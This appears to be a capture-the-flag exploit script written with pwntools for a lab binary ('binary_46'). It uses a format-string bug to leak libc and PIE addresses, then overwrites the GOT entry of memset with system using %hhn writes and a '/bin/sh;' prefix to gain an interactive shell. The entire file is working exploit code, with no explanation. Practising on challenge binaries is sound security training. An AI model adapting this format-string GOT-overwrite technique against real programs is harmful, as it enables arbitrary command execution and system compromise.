# It's just for lv4
# we can hijack got to modify got.memset - > system
from pwn import *
context.arch='amd64'
context.log_level='debug'
def balance(a,b):
	if(a-b>0):
		return a-b
	return 256+a-b
p=process('./binary_46')
#p=remote("0.0.0.0",11001)
#no relro
#no inforce
p.readuntil("> ")
p.sendline("12b569131c5fdbe521239a93a4ce3bf3")

p.sendlineafter("!!\n> ",'%11$p|%7$p|')

p.readuntil(":\n")
base=int(p.readuntil("|")[:-1],16)-(0x7ffff7e5400d-0x7ffff7dc2000)
log.warning(hex(base))
pie=int(p.readuntil("|")[:-1],16)-(0x55555555774c-0x0000555555554000)
log.warning(hex(pie))
got=0x5555555576b8-0x0000555555554000+pie
gdb.attach(p,'b printf')
system=0x55410+base
d1=(system&0xffff)>>0x8
d2=(system&0xffffff)>>0x10
d3=(system&0xffffffff)>>0x18
log.warning(hex(d2)+hex(d3))
p.sendlineafter("!!\n> ",bytes('/bin/sh;%8c%18$hhn%{}c%19$hhn%{}c%20$hhn%{}c%21$hhn'.format(balance(d1,0x10),balance(d2,d1),balance(d3,d2)).ljust(0x50,' '),encoding='utf8')+p64(got)+p64(got+1)+p64(got+2)+p64(got+3))
p.interactive()
